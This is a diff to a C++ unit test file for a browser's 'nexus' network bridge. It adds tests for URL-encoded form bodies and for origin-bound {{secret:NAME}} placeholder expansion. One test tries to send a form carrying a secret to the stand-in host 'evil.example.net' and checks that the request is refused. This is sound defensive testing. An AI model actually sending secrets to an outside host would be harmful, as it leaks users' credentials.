@@ -12,6 +12,7 @@
 
 #include "base/files/file_util.h"
 #include "base/files/scoped_temp_dir.h"
+#include "base/functional/callback_helpers.h"
 #include "base/test/bind.h"
 #include "base/values.h"
 #include "components/os_crypt/async/browser/test_utils.h"
@@ -25,6 +26,7 @@
 #include "services/network/public/cpp/resource_request.h"
 #include "content/public/test/browser_task_environment.h"
 #include "custom_browser/browser/nexus/nexus_bridge_response_delegate.h"
+#include "custom_browser/browser/nexus/nexus_message_port_endpoint.h"
 #include "mojo/public/cpp/base/big_buffer.h"
 #include "net/base/ip_address.h"
 #include "net/base/ip_endpoint.h"
@@ -35,6 +37,8 @@
 #include "services/network/test/test_url_loader_factory.h"
 #include "services/network/test/test_utils.h"
 #include "testing/gtest/include/gtest/gtest.h"
+#include "third_party/blink/public/common/messaging/message_port_descriptor.h"
+#include "third_party/blink/public/common/messaging/string_message_codec.h"
 #include "url/gurl.h"
 
 namespace nexus {
@@ -94,6 +98,20 @@ class NexusNetworkStreamTest : public testing::Test {
   void Dispatch(std::string_view action, base::DictValue payload) {
     EXPECT_TRUE(adapter_.Dispatch(action, "req", NetworkRoute(action),
                                   payload, {}));
+    task_environment_.RunUntilIdle();
+  }
+
+  // httpRequest with no inline body: the guest then sends its (empty) body
+  // over a transferred port, which this does.
+  void DispatchWithPortBody(std::string_view action, base::DictValue payload) {
+    blink::MessagePortDescriptorPair pair;
+    NexusMessagePortEndpoint sender(pair.TakePort0(), base::DoNothing(),
+                                    base::DoNothing());
+    std::vector<blink::MessagePortDescriptor> ports;
+    ports.push_back(pair.TakePort1());
+    sender.Send(blink::WebMessageArrayBufferPayload::CreateForTesting({}));
+    EXPECT_TRUE(adapter_.Dispatch(action, "req", NetworkRoute(action),
+                                  payload, std::move(ports)));
     task_environment_.RunUntilIdle();
   }
 
@@ -313,6 +331,68 @@ TEST_F(NexusNetworkSecretsTest, HttpRequestExpandsHeadersToo) {
   EXPECT_EQ(delegate_.last_error_code, "SECRET_UNAVAILABLE");
 }
 
+// A {{secret:NAME}} form value is expanded for the secret's own origin only,
+// and a body carrying one is never re-sent on a followed redirect.
+TEST_F(NexusNetworkSecretsTest, AFormValueSecretReachesOnlyItsOrigin) {
+  int requests = 0;
+  std::string seen_body;
+  factory_.SetInterceptor(
+      base::BindLambdaForTesting([&](const network::ResourceRequest& request) {
+        ++requests;
+        seen_body = network::GetUploadData(request);
+      }));
+  auto form_request = [](const std::string& url) {
+    base::DictValue payload;
+    payload.Set("url", url);
+    payload.Set("method", "POST");
+    base::DictValue form;
+    form.Set("client_secret", "{{secret:provider:acme}}");
+    form.Set("code", "c 1");
+    payload.Set("formParams", std::move(form));
+    return payload;
+  };
+
+  DispatchWithPortBody("httpRequest",
+                       form_request("https://api.example.com/oauth/token"));
+  EXPECT_EQ(requests, 1) << delegate_.last_error_code;
+  EXPECT_EQ(seen_body, "client_secret=tok-123&code=c+1");
+
+  DispatchWithPortBody("httpRequest",
+                       form_request("https://evil.example.net/token"));
+  EXPECT_EQ(delegate_.last_error_code, "SECRET_ORIGIN_MISMATCH");
+  EXPECT_EQ(requests, 1);
+
+  delegate_.last_error_code.clear();
+  base::DictValue missing = form_request("https://api.example.com/oauth/token");
+  base::DictValue missing_form;
+  missing_form.Set("client_secret", "{{secret:provider:nope}}");
+  missing.Set("formParams", std::move(missing_form));
+  DispatchWithPortBody("httpRequest", std::move(missing));
+  EXPECT_EQ(delegate_.last_error_code, "SECRET_UNAVAILABLE");
+  EXPECT_EQ(requests, 1);
+
+  delegate_.last_error_code.clear();
+  base::DictValue follow = form_request("https://api.example.com/oauth/token");
+  follow.Set("followRedirects", true);
+  DispatchWithPortBody("httpRequest", std::move(follow));
+  EXPECT_EQ(delegate_.last_error_code, "INVALID_ARGS");
+  EXPECT_EQ(requests, 1);
+
+  // Control: a form body without a secret may follow redirects.
+  delegate_.last_error_code.clear();
+  base::DictValue plain;
+  plain.Set("url", "https://api.example.com/oauth/token");
+  plain.Set("method", "POST");
+  plain.Set("followRedirects", true);
+  base::DictValue plain_form;
+  plain_form.Set("code", "c1");
+  plain.Set("formParams", std::move(plain_form));
+  DispatchWithPortBody("httpRequest", std::move(plain));
+  EXPECT_TRUE(delegate_.last_error_code.empty()) << delegate_.last_error_code;
+  EXPECT_EQ(requests, 2);
+  EXPECT_EQ(seen_body, "code=c1");
+}
+
 // A secret expanded into the query goes on the wire but never comes back to
 // the guest: finalUrl shows the placeholder.
 TEST_F(NexusNetworkSecretsTest, FinalUrlNeverEchoesAnExpandedSecret) {
@@ -356,6 +436,78 @@ TEST_F(NexusNetworkSecretsTest, StreamFinalUrlNeverEchoesAnExpandedSecret) {
       delegate_.last_success.GetDict().FindString("finalUrl");
   ASSERT_TRUE(final_url);
   EXPECT_EQ(final_url->find("tok-123"), std::string::npos) << *final_url;
+}
+
+// formParams: the host encodes the form body and labels it, unless the guest
+// named its own Content-Type.
+TEST_F(NexusNetworkStreamTest, FormParamsAreSentAsAUrlEncodedBody) {
+  std::string seen_body;
+  std::string seen_type;
+  factory_.SetInterceptor(
+      base::BindLambdaForTesting([&](const network::ResourceRequest& request) {
+        seen_body = network::GetUploadData(request);
+        seen_type = request.headers.GetHeader("Content-Type").value_or("");
+      }));
+
+  base::DictValue payload;
+  payload.Set("url", "https://auth.example.com/token");
+  payload.Set("method", "POST");
+  base::DictValue form;
+  form.Set("grant_type", "authorization_code");
+  form.Set("code", "a b&c");
+  payload.Set("formParams", std::move(form));
+  DispatchWithPortBody("httpRequest", std::move(payload));
+  EXPECT_EQ(delegate_.error_count, 0) << delegate_.last_error_code;
+  EXPECT_EQ(seen_body, "code=a+b%26c&grant_type=authorization_code");
+  EXPECT_EQ(seen_type, "application/x-www-form-urlencoded");
+
+  base::DictValue typed;
+  typed.Set("url", "https://auth.example.com/token");
+  typed.Set("method", "POST");
+  base::DictValue headers;
+  headers.Set("content-type",
+              "application/x-www-form-urlencoded; charset=utf-8");
+  typed.Set("headers", std::move(headers));
+  base::DictValue typed_form;
+  typed_form.Set("k", "v");
+  typed.Set("formParams", std::move(typed_form));
+  DispatchWithPortBody("httpRequest", std::move(typed));
+  EXPECT_EQ(seen_body, "k=v");
+  EXPECT_EQ(seen_type, "application/x-www-form-urlencoded; charset=utf-8");
+}
+
+TEST_F(NexusNetworkStreamTest, FormParamsRefuseABodyAndGetOrHead) {
+  int requests = 0;
+  factory_.SetInterceptor(base::BindLambdaForTesting(
+      [&](const network::ResourceRequest&) { ++requests; }));
+  base::DictValue form;
+  form.Set("k", "v");
+
+  base::DictValue with_body = RequestPayload("https://auth.example.com/token");
+  with_body.Set("formParams", form.Clone());
+  Dispatch("httpRequest", std::move(with_body));
+  EXPECT_EQ(delegate_.last_error_code, "INVALID_REQUEST");
+
+  for (const char* method : {"GET", "HEAD"}) {
+    delegate_.last_error_code.clear();
+    base::DictValue get;
+    get.Set("url", "https://auth.example.com/token");
+    get.Set("method", method);
+    get.Set("formParams", form.Clone());
+    DispatchWithPortBody("httpRequest", std::move(get));
+    EXPECT_EQ(delegate_.last_error_code, "INVALID_REQUEST") << method;
+  }
+
+  delegate_.last_error_code.clear();
+  base::DictValue not_string;
+  not_string.Set("url", "https://auth.example.com/token");
+  not_string.Set("method", "POST");
+  base::DictValue number_form;
+  number_form.Set("n", 1);
+  not_string.Set("formParams", std::move(number_form));
+  DispatchWithPortBody("httpRequest", std::move(not_string));
+  EXPECT_EQ(delegate_.last_error_code, "INVALID_ARGS");
+  EXPECT_EQ(requests, 0);
 }
 
 // net::HttpRequestHeaders::SetHeader CHECKs a header's name and value; a
